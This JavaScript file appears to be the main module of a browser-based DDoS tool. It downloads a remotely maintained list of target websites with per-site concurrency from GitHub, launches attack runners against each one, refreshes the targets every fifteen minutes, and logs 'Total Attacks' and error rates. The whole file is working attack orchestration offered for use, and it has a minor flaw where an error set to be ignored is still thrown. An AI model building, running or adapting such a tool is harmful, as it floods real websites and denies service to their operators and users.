/**
 * @type {import('axios').AxiosStatic}
 */
const axios = require('axios')
const { assert } = require('console')
const { EventEmitter } = require('events')

const { sleep } = require('./helpers')
const { runner } = require('./runner')
const { runBrowser, getActiveContexts } = require('./browser')

// interval between printing stats and calculating error rate
const logInterval = 60 * 1000
const urlsPoolInterval = 15 * 60 * 1000
const sitesUrls = ['https://raw.githubusercontent.com/mgrybyk/uasword/pw-only/data/sites.json']

const main = async () => {
  await runBrowser()

  const eventEmitter = new EventEmitter()
  eventEmitter.setMaxListeners(100)

  let urlList = await getSites()
  await run(eventEmitter, urlList)

  statsLogger(eventEmitter)
  siteListUpdater(eventEmitter, urlList)
}

/**
 * @param {EventEmitter} eventEmitter
 * @param {Array<{page:string,max_concurrency:number}>} urlList
 */
const siteListUpdater = (eventEmitter, urlList) => {
  setInterval(async () => {
    const updatedUrlList = await getSites({ ignoreError: true })

    if (JSON.stringify(updatedUrlList) !== JSON.stringify(urlList)) {
      eventEmitter.emit('RUNNER_STOP')
      console.log('\n', new Date().toISOString(), 'Updating urls list\n')
      urlList.length = 0
      urlList = updatedUrlList
      run(eventEmitter, urlList)
    }
  }, urlsPoolInterval)
}

/**
 * @param {EventEmitter} eventEmitter
 * @param {Array<{page:string,max_concurrency:number}>} urlList
 */
const run = async (eventEmitter, urlList) => {
  for (let i = 0; i < urlList.length; i++) {
    await sleep(1000)
    runner(urlList[i].page, urlList[i].max_concurrency, eventEmitter)
  }
}

/**
 * @param {EventEmitter} eventEmitter
 */
const statsLogger = (eventEmitter) => {
  let stats = []
  let totalRequests = 0

  eventEmitter.on('RUNNER_STATS', (s) => {
    stats.push(s)
    totalRequests += s.new_reqs
  })

  setInterval(() => {
    stats.length = 0
    eventEmitter.emit('GET_STATS')
    setTimeout(() => {
      const activeRunners = stats.filter(({ isActive }) => isActive)
      const tableData = []
      activeRunners
        .sort((a, b) => b.pending - a.pending)
        .forEach(({ url, total_reqs, errRate, pending }) => {
          tableData.push({ url, Attacks: total_reqs, 'Errors,%': errRate, Ctx: pending })
        })
      if (activeRunners.length > 0) {
        console.table(tableData)
      }
    }, 1000)
  }, logInterval / 2)

  setInterval(() => {
    setTimeout(() => {
      console.log('Total Attacks', totalRequests, '| Total Active ctx', getActiveContexts())
    }, 1000)
  }, logInterval)
}

/**
 *
 * @returns {Promise<string[]>}
 */
const getSites = async ({ ignoreError = false } = {}) => {
  let urlList = []

  for (const sitesUrl of sitesUrls) {
    try {
      const res = await axios.get(sitesUrl, {
        headers: {
          'Cache-Control': 'no-cache',
          Pragma: 'no-cache',
          Expires: '0',
        },
      })
      assert(Array.isArray(res.data))
      if (res.data.length > 0) {
        assert(typeof res.data[0].page === 'string')
      }
      urlList.push(...res.data)
    } catch (err) {
      if (ignoreError) {
        console.log(new Date().toISOString(), 'WARN: Failed to get new urls list from', sitesUrl)
      }
      throw err
    }
  }

  return urlList
}

module.exports = { main }
